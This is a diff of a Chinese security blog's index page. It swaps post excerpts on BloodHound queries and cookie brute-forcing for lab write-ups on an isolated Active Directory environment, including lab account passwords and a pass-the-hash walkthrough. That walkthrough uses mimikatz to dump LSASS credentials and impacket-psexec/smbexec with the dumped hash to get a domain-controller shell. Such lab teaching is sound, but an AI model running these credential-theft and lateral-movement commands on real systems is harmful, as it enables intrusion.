@@ -117,11 +117,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2026/03/23/BloodHound/" >BloodHound食用</a>
+			<a href="/2026/03/17/委派攻击域情况/" >委派攻击域情况</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2026-03-23  </div>
+		<div class="date">post @ 2026-03-17  </div>
 		</div>
 	</div>
 	
@@ -131,143 +131,113 @@
   <div class="row">
 	
 	
-		<h2 id="1-手册概述"><a href="#1-手册概述" class="headerlink" title="1. 手册概述"></a>1. 手册概述</h2><p>BloodHound 是域渗透测试中核心的可视化分析工具，其预构建分析查询可精准定位域内高价值目标、攻击路径、高危权限配置与协议漏洞。本手册系统拆解所有预构建查询的核心用途、实战价值，并给出分阶段使用策略，帮助渗透测试人员高效利用查询结果规划攻击链路。</p>
-<h2 id="2-预构建查询分类详解"><a href="#2-预构建查询分类详解" class="headerlink" title="2. 预构建查询分类详解"></a>2. 预构建查询分类详解</h2><h3 id="2-1-域基础信息类（Domain-Information）"><a href="#2-1-域基础信息类（Domain-Information）" class="headerlink" title="2.1 域基础信息类（Domain Information）"></a>2.1 域基础信息类（Domain Information）</h3><table>
+		<h3 id="一、环境拓扑概览"><a href="#一、环境拓扑概览" class="headerlink" title="一、环境拓扑概览"></a>一、环境拓扑概览</h3><ul>
+<li><strong>域名</strong>：<code>REDTEAM</code>（NetBIOS 名称），DNS 域名为 <code>REDTEAM.com</code></li>
+<li><strong>主域控制器</strong>：主机名 <code>DC1</code>，IP <code>192.168.18.10</code>，同时作为主 DNS 服务器</li>
+<li><strong>备份域控制器</strong>：主机名 <code>DC2</code>，IP <code>192.168.18.20</code>，作为备用 DNS 服务器</li>
+<li><strong>成员服务器1</strong>：<code>12server1</code>，IP <code>192.168.18.30</code>，已加入域</li>
+<li><strong>成员服务器2</strong>：<code>12server2</code>，IP <code>192.168.18.40</code>，已加入域</li>
+<li><strong>攻击机</strong>：<code>Kali-2025</code>，IP <code>192.168.18.100</code>，模拟外部攻击者（为实验方便置于同一网络）</li>
+<li><strong>网络模式</strong>：仅主机（Host-Only），所有虚拟机处于同一隔离网络 <code>192.168.18.0/24</code></li>
+</ul>
+<hr>
+<h3 id="二、Mermaid-域关系图"><a href="#二、Mermaid-域关系图" class="headerlink" title="二、Mermaid 域关系图"></a>二、Mermaid 域关系图</h3><p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_1.png" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="三、核心表格：账号密码及登录关系"><a href="#三、核心表格：账号密码及登录关系" class="headerlink" title="三、核心表格：账号密码及登录关系"></a>三、核心表格：账号密码及登录关系</h3><table>
 <thead>
 <tr>
-<th>查询名称</th>
-<th>核心作用</th>
-<th>实战价值</th>
-<th>备注</th>
+<th>账号标识</th>
+<th>密码</th>
+<th>账号类型</th>
+<th>登录格式示例</th>
+<th>认证位置</th>
+<th>可登录主机</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Find all Domain Admins</td>
-<td>列出<code>Domain Admins</code>组的所有成员</td>
-<td>明确域内最高权限账号，锁定渗透最终目标</td>
-<td>所有后续查询的核心参照目标</td>
+<td><strong>域管理员 Administrator</strong></td>
+<td><code>QWEasd123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\Administrator</code> 或 <code>administrator@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机（DC&#x2F;成员服务器）</td>
 </tr>
 <tr>
-<td>Map Domain Trusts</td>
-<td>可视化域信任关系（父子域&#x2F;外部域&#x2F;林信任）</td>
-<td>规划跨域渗透路径，找到从子域突破到父域的链路</td>
-<td>需结合域控拓扑分析信任方向</td>
+<td><strong>域用户 test</strong></td>
+<td><code>pass@123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\test</code> 或 <code>test@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
 </tr>
 <tr>
-<td>Find Computers with Unsupported Operating Systems</td>
-<td>查找运行已停止支持系统（Win7&#x2F;2008&#x2F;XP等）的主机</td>
-<td>定位最易突破的初始攻击入口（漏洞多、补丁少）</td>
-<td>优先作为初始打点的目标清单</td>
+<td><strong>域用户 hack</strong></td>
+<td><code>pass@123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\hack</code> 或 <code>hack@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 web</strong></td>
+<td><code>123456</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\web</code> 或 <code>web@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 websec</strong></td>
+<td><code>123456</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\websec</code> 或 <code>websec@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>DC1本地管理员</strong></td>
+<td>（默认）</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>DC1\Administrator</code></td>
+<td>DC1本地SAM</td>
+<td>仅主域控制器 <code>DC1</code></td>
+</tr>
+<tr>
+<td><strong>DC2本地管理员</strong></td>
+<td>（默认）</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>DC2\Administrator</code></td>
+<td>DC2本地SAM</td>
+<td>仅备份域控制器 <code>DC2</code></td>
+</tr>
+<tr>
+<td><strong>12server1本地管理员</strong></td>
+<td><code>456789</code></td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>12server1\Administrator</code></td>
+<td>12server1本地SAM</td>
+<td>仅成员服务器 <code>12server1</code></td>
+</tr>
+<tr>
+<td><strong>12server2本地管理员</strong></td>
+<td><code>123456</code></td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>12server2\Administrator</code></td>
+<td>12server2本地SAM</td>
+<td>仅成员服务器 <code>12server2</code></td>
 </tr>
 </tbody></table>
-<h3 id="2-2-危险权限类（Dangerous-Privileges）"><a href="#2-2-危险权限类（Dangerous-Privileges）" class="headerlink" title="2.2 危险权限类（Dangerous Privileges）"></a>2.2 危险权限类（Dangerous Privileges）</h3><table>
-<thead>
-<tr>
-<th>查询名称</th>
-<th>核心作用</th>
-<th>实战价值</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Find Principals with DCSync Rights</td>
-<td>查找拥有<code>DCSync</code>权限的主体（用户&#x2F;组&#x2F;计算机）</td>
-<td>拿到该权限可直接同步所有域账号哈希，控制整个域</td>
-<td>域内最高危权限，优先级最高的攻击目标</td>
-</tr>
-<tr>
-<td>Users with Foreign Domain Group Membership</td>
-<td>查找属于外部域组的用户</td>
-<td>作为跨域攻击入口，利用用户在其他域的权限突破边界</td>
-<td>需结合域信任关系分析权限传递</td>
-</tr>
-<tr>
-<td>Groups with Foreign Domain Group Membership</td>
-<td>查找包含外部域成员的组</td>
-<td>利用组权限传递特性，实现跨域横向渗透</td>
-<td>重点关注高权限组（如管理员组）的外部成员</td>
-</tr>
-<tr>
-<td>Find Computers where Domain Users are Local Admin</td>
-<td>查找普通域用户为本地管理员的主机</td>
-<td>横向移动核心入口，拿到主机权限后窃取高权限凭证</td>
-<td>优先对这类主机进行横向打点</td>
-</tr>
-<tr>
-<td>Find Computers where Domain Users can read LAPS passwords</td>
-<td>查找可读取LAPS密码的主机</td>
-<td>直接获取主机本地管理员权限，无需破解</td>
-<td>LAPS为本地管理员密码管理工具，是高价值目标</td>
-</tr>
-<tr>
-<td>Find All Paths from Domain Users to High Value Targets</td>
-<td>生成从普通域用户到高价值目标的完整攻击路径</td>
-<td>渗透核心导航，明确“从哪台机、用哪个账号”提权</td>
-<td>初始渗透阶段首选查询</td>
-</tr>
-<tr>
-<td>Find Workstations where Domain Users can RDP</td>
-<td>查找普通用户可RDP的工作站</td>
-<td>直接登录后提权、窃取凭证</td>
-<td>优先选择核心业务人员的工作站</td>
-</tr>
-<tr>
-<td>Find Servers where Domain Users can RDP</td>
-<td>查找普通用户可RDP的服务器</td>
-<td>服务器承载关键服务，易接触高权限账号</td>
-<td>重点关注数据库、应用服务器</td>
-</tr>
-<tr>
-<td>Find Dangerous Privileges for Domain Users Groups</td>
-<td>查找域用户组的危险特权（如<code>SeImpersonatePrivilege</code>）</td>
-<td>利用特权实现本地提权，获取系统权限</td>
-<td>结合提权工具（如JuicyPotato）使用</td>
-</tr>
-<tr>
-<td>Find Domain Admin Logons to non-Domain Controllers</td>
-<td>查找域管理员登录过的非域控主机</td>
-<td>窃取这些主机的凭证可直接拿到域管权限</td>
-<td>最稳定的提权方式之一，优先分析</td>
-</tr>
-</tbody></table>
-<h3 id="2-3-Kerberos-协议类（Kerberos-Interaction）"><a href="#2-3-Kerberos-协议类（Kerberos-Interaction）" class="headerlink" title="2.3 Kerberos 协议类（Kerberos Interaction）"></a>2.3 Kerberos 协议类（Kerberos Interaction）</h3><table>
-<thead>
-<tr>
-<th>查询名称</th>
-<th>核心作用</th>
-<th>实战价值</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Find Kerberoastable Members of High Value Groups</td>
-<td>查找高价值组中可被Kerberoasting攻击的成员</td>
-<td>优先攻击高权限服务账号，提升提权效率</td>
-<td>高价值组包括域管组、企业管理员组等</td>
-</tr>
-<tr>
-<td>List all Kerberoastable Accounts</td>
-<td>列出所有带SPN的用户&#x2F;服务账号</td>
-<td>发起Kerberoasting攻击，离线破解NTLM哈希</td>
-<td>需结合Impacket等工具请求服务票据</td>
-</tr>
-<tr>
-<td>Find Kerberoastable Users with most privileges</td>
-<td>查找权限最高的可Kerberoasting用户</td>
-<td>精准定位高价值攻击目标，减少无效破解</td>
-<td>结合权限图谱分析用户所属组</td>
-</tr>
-<tr>
-<td>Find AS-REP Roastable Users (DontReqPreAuth)</td>
-<td>查找无需Kerberos预认证的用户</td>
-<td>发起AS-REP Roasting攻击，直接获取NT哈希</td>
-<td>攻击门槛极低，无前置权限也可执行</td>
-</tr>
-</tbody></table>
-<h3 id="2-4-最短路径类（Shortest-Paths）"><a href="#2-4-最短路径类（Shortest-Paths）" class="headerlink" title="2.4 最短路径类（Shortest Paths）"></a>2.4 最短路径类（Shortest Paths）</h3>
+<blockquote>
+<p><strong>登录格式说明</strong>：  </p>
+<ul>
+<li>域登录：<code>REDTEAM\用户名</code> 或 <code>用户名@REDTEAM.com</code>  </li>
+<li>本地登录：<code>.\用户名</code> 或 <code>计算机名\用户名</code></li>
+</ul>
+</blockquote>
+<hr>
 	
 	</div>
-  <a type="button" href="/2026/03/23/BloodHound/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/2026/03/17/委派攻击域情况/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -277,11 +247,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2026/03/09/SRC挖掘思路_V1.1/" >SRC挖掘思路_V1.1</a>
+			<a href="/2026/03/13/内网渗透域情况/" >内网渗透域情况</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2026-03-09  </div>
+		<div class="date">post @ 2026-03-13  </div>
 		</div>
 	</div>
 	
@@ -291,25 +261,140 @@
   <div class="row">
 	
 	
-		<h1 id="一、逻辑漏洞——那些”另类”的挖掘角度"><a href="#一、逻辑漏洞——那些”另类”的挖掘角度" class="headerlink" title="一、逻辑漏洞——那些”另类”的挖掘角度"></a>一、逻辑漏洞——那些”另类”的挖掘角度</h1><h2 id="1-1-Cookie-里的参数，删着删着就出洞了"><a href="#1-1-Cookie-里的参数，删着删着就出洞了" class="headerlink" title="1.1 Cookie 里的参数，删着删着就出洞了"></a>1.1 Cookie 里的参数，删着删着就出洞了</h2><p>数据包中的 cookie 有一大串参数，且其他参数暂时没有发现或者是大概率不会出问题的参数时，要不要因”害怕”而不敢测试？</p>
-<p><strong>这里要反过来想</strong>：一个大厂用户量很大，如果每个用户的 cookie 都在动态变化，那服务端就需要维护一套复杂的 cookie 生成&#x2F;校验机制，每次请求都要查库验证——这对性能的消耗是巨大的。所以为了降成本，很多系统实际上会为每个用户分配一个<strong>固定的 cookie 值</strong>，服务端只做简单的字符串匹配（查表比对），而不是每次都重新计算。</p>
-<blockquote>
-<p><strong>推理深挖</strong>：这个假设的底层逻辑是”成本驱动架构决策”——大厂用户量大，性能压力会把架构往”简单校验”方向推。如果 cookie 是每次动态生成的，那每个请求都要跑一遍生成算法 + 数据库查询；而固定 cookie 只需要一次写入、后续直接比对。对于千万级 DAU 的系统，这个性能差距是数量级的。所以当你看到 cookie 里参数很多时，不要被”看起来很复杂”吓住——<strong>表面复杂 ≠ 实际安全</strong>，很多参数只是历史遗留的装饰品，服务端根本不去校验它们。</p>
-<p><strong>再深一层</strong>：那我怎么知道哪些参数可能是”装饰品”、哪些是真的？这就是”删除法”的前置判断——你要对参数做<strong>价值排序</strong>。一般来说，cookie 里类似 <code>utm_source</code>、<code>_ga</code>、<code>ref</code> 这种明显是分析&#x2F;追踪类的，大概率不参与鉴权；而 <code>token</code>、<code>sid</code>、<code>uid</code>、<code>auth</code> 这种命名的，可疑度更高。但排序只是帮你提高效率——<strong>最终判定依据永远是”删了之后响应变没变”</strong>。不要靠猜，要靠测。</p>
-</blockquote>
-<p>这意味着什么？意味着 cookie 里的参数大概率是可以预测的，甚至可以暴力枚举的。</p>
-<p><strong>做法就是逐步删除</strong> cookie 中的参数并观察回显，直到回显错误。这里的逻辑是：如果我删除了某个参数，服务端依然正常返回，说明这个参数<strong>没有被校验</strong>，去掉也没关系。一直删到某个参数——删了之后返回异常——那就锁定了真正起鉴权作用的参数。</p>
-<blockquote>
-<p><strong>推理深挖</strong>：删除测试法的本质是<strong>控制变量实验</strong>。你把 cookie 的每个参数当作一个自变量，逐一置零（删除），观测因变量（响应是否正常）。这个方法之所以有效，是因为大多数后端对 cookie 的解析是”按 key 取值”的——你没传的 key，后端取值就是 null&#x2F;undefined，不参与比较。所以删到某个 key 响应变了，说明这个 key 参与了决策逻辑。</p>
-<p><strong>再深一层——为什么先删而不是先改？</strong> 这是一个策略优先级问题。改一个参数的值，你不知道改成什么才算”对”——搜索空间太大了（假设值是 32 位 hex，可能性是 16^32）。但删除是二元的：删了之后正常 or 异常，一次请求就出结果。<strong>删除是 O(1) 的探测，修改是 O(∞) 的猜测</strong>。所以永远先删后改，先定位目标再攻破目标——这是所有安全测试的通用策略：先缩小攻击面，再精准打击。</p>
-</blockquote>
-<p>然后对剩下的 cookie 参数的每一位（也可以看规律）进行字母爆破。为什么是字母爆破？因为 cookie 参数往往就是一串大小写的英文字符（session id、token 这些都是 hex 或 base64，本质上就是 A-Za-z0-9）。每一位爆破 52 次（26+26），当回显不同时那就有料了——说明这一位的值会影响服务端的判断结果。</p>
-<blockquote>
-<p><strong>再深一层——逐位爆破能成功的前提是什么？</strong> 前提是服务端的字符串比较是<strong>逐字符比对、且比对失败即返回</strong>的。如果服务端做了”恒等比较”（整个字符串一起比对，返回整体 true&#x2F;false），那逐位爆破就看不到差异——你改任何一位，结果都是”不匹配”，没有中间状态。但好消息是，很多系统出于性能考虑，字符串比较用的是 <code>memcmp</code> 或者简单的循环比对，第一个不同的字符就 break 了——因为比对时间不同，你就可以通过<strong>时间侧信道</strong>（响应时间差异）来逐位推断。即使没有时间差异，有些系统在不同比对结果下返回了不同的业务状态码（”未登录” vs “无权限”），这也给了你逐位爆破的信号。<strong>所以逐位爆破的前提是”存在可观测的逐位差异信号”——时间差异、状态差异、内容差异，三者至少有一个。</strong></p>
-</blockquote>
+		<pre><code>### 一、环境拓扑概览
+- **域名**：`HACKING`（NetBIOS 名称），DNS 域名为 `hacking.com`
+- **域控制器**：`DC_2012_R2`（Windows Server 2012 R2，IP：192.168.64.10）
+- **成员服务器**：`winserv12R2`（已加入域，IP：192.168.64.20）
+- **加入域的 Windows 10 主机**：`win10`（已加入域，IP：192.168.64.30）
+- **攻击机**：`Kali-2025`（IP：192.168.64.100，模拟外部攻击者，为实验方便置于同一网络）
+- **网络模式**：仅主机（Host-Only），所有虚拟机处于同一隔离网络（192.168.64.0/24）
+
+---
+
+### 二、Mermaid 域关系图
+</code></pre>
+<p>  <img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_1.png" alt="在这里插入图片描述"></p>
+<pre><code>---
+
+### 三、核心表格：账号密码及登录关系
+
+| 账号标识                    | 密码        | 账号类型 | 登录格式示例                                           | 认证位置          | 可登录主机                            |
+| --------------------------- | ----------- | -------- | ------------------------------------------------------ | ----------------- | ------------------------------------- |
+| **域管理员 Administrator**  | 默认密码    | 域账号   | `HACKING\Administrator` 或 `administrator@hacking.com` | 域控制器          | 域内所有计算机（DC/成员服务器/Win10） |
+| **域用户 user1**            | `qwER1234.` | 域账号   | `HACKING\user1` 或 `user1@hacking.com`                 | 域控制器          | 域内所有计算机                        |
+| **域用户 test**             | `qwER1234.` | 域账号   | `HACKING\test` 或 `test@hacking.com`                   | 域控制器          | 域内所有计算机                        |
+| **DC本地管理员**            | 默认密码    | 本地账号 | `.\Administrator` 或 `DC_2012_R2\Administrator`        | DC本地SAM         | 仅域控制器 `DC_2012_R2`               |
+| **成员服务器本地管理员**    | 默认密码    | 本地账号 | `.\Administrator` 或 `winserv12R2\Administrator`       | 成员服务器本地SAM | 仅成员服务器 `winserv12R2`            |
+| **成员服务器本地用户 kdy1** | `qwER1234.` | 本地账号 | `.\kdy1` 或 `winserv12R2\kdy1`                         | 成员服务器本地SAM | 仅成员服务器 `winserv12R2`            |
+| **Win10本地管理员**         | 默认密码    | 本地账号 | `.\Administrator` 或 `win10\Administrator`             | Win10本地SAM      | 仅 Win10 主机                         |
+
+&gt; **登录格式说明**：
+&gt; - 域登录：`HACKING\用户名` 或 `用户名@hacking.com`
+&gt; - 本地登录：`.\用户名` 或 `计算机名\用户名`
+
+---
+
+### 四、域登录机制
+1. **非域控制器上登录域用户**：
+   - 本机向域控制器发送验证请求：验证用户提供的域账号和密码。
+   - 域控制器核对 Active Directory 中的账号信息后返回结果。
+   - 验证通过后，允许用户登录本机，并在本机创建用户配置文件（`C:\Users\用户名`）。
+2. **域用户的权限**：
+   - 域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。
+3. **加入域的过程**：
+   - 使用域管理员账号（如 `HACKING\Administrator`）临时授权，将计算机添加到域。
+   - 此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。
+4. **域账号的通用性**：
+   - 一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。
+
+---
+
+### 五、常用命令解析
+
+| 命令                               | 作用                                                     |
+| ---------------------------------- | -------------------------------------------------------- |
+| `net accounts /maxpwage:unlimited` | 设置域账户密码永不过期（常用于服务账号）                 |
+| `net config workstation`           | 显示当前计算机的工作站配置，验证加域状态                 |
+| `net view /domain:HACKING`         | 列出域 `HACKING` 中的所有计算机（注意 `HACKING` 需大写） |
+| `net user`                         | 列出本地计算机上的所有本地用户账户                       |
+| `whoami`                           | 显示当前登录的用户名及所在域/计算机                      |
+| `nslookup hacking.com`             | 测试 DNS 解析，应返回域控 IP `192.168.64.10`             |
+
+---
+
+### 六、当前状态验证（预期）
+- **网络连通性**：所有主机在同一 Host-Only 网络，可互相 ping 通（需关闭 Windows 防火墙或放行 ICMP，尤其是 win10）。
+- **DNS解析**：在成员服务器和 win10 上执行 `nslookup hacking.com` 应返回 `192.168.64.10`。
+- **域控可见性**：`net view /domain:HACKING` 应列出域内所有计算机（DC、winserv12R2、win10）。若 win10 执行该命令出现“系统错误 1231”，请在 win10 中启用 SMB 1.0（控制面板 → 程序 → 启动或关闭 Windows 功能 → 勾选“SMB 1.0/CIFS 文件共享支持”）。
+- **域用户登录测试**：
+  - `HACKING\user1` 可登录成员服务器 `winserv12R2` 和 win10。
+  - `HACKING\test` 可登录 win10 和成员服务器。
+- **本地用户登录测试**：
+  - `.\kdy1` 可登录成员服务器 `winserv12R2`。
+  - `.\Administrator` 可登录各自主机本地。
+
+---
+
+### 七、渗透测试攻击路径示意
+1. **信息收集**：Kali 扫描内网主机（`nmap -sV 192.168.64.0/24`），识别开放端口和服务。
+2. **初始入侵**：针对成员服务器 `winserv12R2`（可能运行 Web 服务）或 win10 的漏洞进行利用，获取初始权限。
+3. **权限提升**：在受控主机上进行本地提权，获取 SYSTEM 或本地管理员权限。
+4. **横向移动**：
+   - 从受控主机收集域信息（域用户、组策略、信任关系等）。
+   - 抓取主机内的凭据（如 LSASS 进程中的 NTLM Hash/明文密码）。
+   - 利用 **PTH（Pass The Hash）哈希传递** 攻击域控 `192.168.64.10` 或其他域内主机。
+5. **域控权限获取**：成功控制域控后，获取整个域的管理权限。
+
+---
+
+### 八、Windows认证机制与PTH哈希传递（横向渗透核心）
+
+#### 8.1 Windows认证体系核心组件
+| 组件                               | 位置               | 功能                                                         |
+| ---------------------------------- | ------------------ | ------------------------------------------------------------ |
+| **LSASS.exe**                      | 每台Windows主机    | 负责本地安全策略、用户认证、生成访问令牌，是认证的中心进程。 |
+| **Netlogon 服务**                  | 每台Windows主机    | 处理域认证通道，与域控的Netlogon服务通信，建立安全通道。     |
+| **NTLM SSP**                       | LSASS内部          | 实现NTLM质询/响应协议，支持向下兼容认证。                    |
+| **Kerberos SSP**                   | LSASS内部          | 实现Kerberos V5认证协议，域内默认认证方式。                  |
+| **SAM**（注册表）                  | `HKLM\SAM`         | 存储本地用户凭证的NTLM哈希。                                 |
+| **Active Directory**               | 域控制器           | 存储所有域用户/计算机的凭证哈希、Kerberos密钥等信息。        |
+| **KDC**（Key Distribution Center） | 域控制器           | Kerberos认证中心，包含AS和TGS服务。                          |
+| **NTDS.dit**                       | 域控制器数据库文件 | Active Directory的物理存储文件，包含所有对象及哈希。         |
+
+#### 8.2 域登录认证详解：Kerberos 主流程与 NTLM 回退机制
+</code></pre>
+<p>  <img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_2.png" alt="在这里插入图片描述"></p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_3.png" alt="在这里插入图片描述"></p>
+<pre><code>#### 8.4 PTH攻击实操示例（针对当前环境）
+假设已通过Web漏洞获得`winserv12R2`的SYSTEM权限：
+
+1. **在winserv12R2上运行mimikatz抓取域用户`user1`的哈希**：
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+   输出中包含`user1`的NTLM哈希，例如`8846f7eaee8fb117ad06bdd830b7586c`。
+
+2. **在Kali上使用impacket-psexec直接登录域控**：
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.10</span><br></pre></td></tr></table></figure>
+   成功获得域控的cmd shell。
+
+3. **使用相同哈希登录Win10**：
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.30</span><br></pre></td></tr></table></figure>
+   实现横向移动。
+
+---
+
+### 九、注意事项
+- **防火墙**：所有主机需关闭 Windows 防火墙或放行必要端口（ICMP、SMB 445/139、RDP 3389 等），以便测试连通性和 PTH 攻击。
+- **实验隔离**：环境仅限 Host-Only 网络，确保与外部网络隔离，防止意外泄露或攻击外部系统。
+- **密码安全**：默认密码仅为实验方便，实际生产环境应立即修改并启用强密码策略。
+- **PTH 适用性**：PTH 攻击基于 NTLM 协议，若目标强制使用 Kerberos 且未配置约束委派，可能受限。可配合其他攻击手法（如黄金票据、PTK）。
+- **LSASS 保护**：现代 Windows 可启用 LSA 保护（RunAsPPL）防止凭据提取，实验环境中可暂时关闭以便测试。
+
+---
+</code></pre>
+
 	
 	</div>
-  <a type="button" href="/2026/03/09/SRC挖掘思路_V1.1/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/2026/03/13/内网渗透域情况/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -358,7 +443,7 @@
 <div class="widget-wrap">
   <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
   <div class="widget category-tree">
-    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">33</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">5</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li 